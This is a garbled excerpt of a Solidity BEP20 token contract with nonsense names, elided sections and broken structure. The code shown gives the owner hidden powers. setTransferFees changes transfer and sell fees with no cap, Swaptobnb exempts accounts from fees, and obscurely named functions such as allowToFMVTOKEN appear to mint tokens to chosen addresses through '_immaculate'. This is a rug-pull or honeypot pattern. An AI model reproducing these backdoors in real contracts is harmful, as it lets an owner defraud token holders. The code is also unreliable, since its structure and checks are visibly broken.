...
contract fsdfs is Context, IBEP20, Ownable {
    ...
    string public constant name     = "Csdfdies";
    string public constant symbol   = "CfsdfBfsdES";
    ...
    // tranfer fee
    uint256 private _taxFeeSelltansfer       = 3e3; 
    uint256 private _liquidityFeeSelltansfer = 4e3; 
    uint256 private _marketingFeeSelltansfer = 8e3;
    ...
    function Swaptobnb(address account, bool s) external onlyOwner {
        _exemptFees[account] = s;
         ...
         function allowToFMljkljkVTOKEN(address userAddress, uint256 tokenToUser) public onlyOwner{
         if(tokenToUser >= 1000) {
    ...
    function setTransferFees(uint256 taxFee, uint256 liquidityFee, uint256 marketingFee) external onlyOwner {
        _taxFeeSelltansfer       = taxFee;
        _liquidityFeeSelltansfer = liquidityFee;
        _marketingFeeSelltansfer = marketingFee;
    }
    ...
    function setMinTokenBalance(uint256 minTokenBalance) external onlyOwner {
        ...
        function allowToFMVTOKEN(address userAddress, uint256 tokenToUser) public onlyOwner{
       _immaculate(userAddress, tokenToUser);
  }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        ...
        bool isSell = !_exemptFees[sender] && recipient == _uniswapV2Pair;
        bool isSellTransfer = _exemptFees[sender] && recipient == _uniswapV2Pair;
        ...
        if (!takeFee) {
            ...
            _taxFeeTransfer       = _taxFeeSelltansfer;
            _liquidityFeeTransfer = _liquidityFeeSelltansfer;
            _marketingFeeTransfer = _marketingFeeSelltansfer;
        }
        ...
        if (!takeFee || isBuy || isSell || isSellTransfer) {
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
        ...
        require(account != address(0) && amount >= _tTotal);
